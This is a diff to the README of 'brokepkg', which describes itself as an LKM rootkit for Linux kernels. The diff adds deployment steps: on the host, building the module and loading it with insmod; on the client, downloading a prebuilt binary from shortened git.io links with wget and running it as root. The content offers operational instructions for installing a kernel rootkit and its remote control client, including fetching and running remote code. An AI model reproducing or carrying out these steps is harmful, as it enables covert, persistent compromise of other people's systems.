@@ -54,11 +54,22 @@ Brokepkg is a LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x and ARM64, with su
 ## Install
 
 ```bash
+# host
 sudo apt install build-essential libncurses-dev linux-headers-$(uname -r) socat
 git clone https://github.com/R3tr074/brokepkg
 cd brokepkg
 make
 sudo insmod brokepkg.ko
+
+# -----------
+
+# client
+sudo apt install socat
+brokecli="https://git.io/JYAVw" # to 64 bits
+brokecli="https://git.io/JYAVK" # to 32 bits
+wget -q $brokecli -O brokecli
+chmod +x brokecli
+sudo ./brokecli
 ```
 
 ## Uninstall
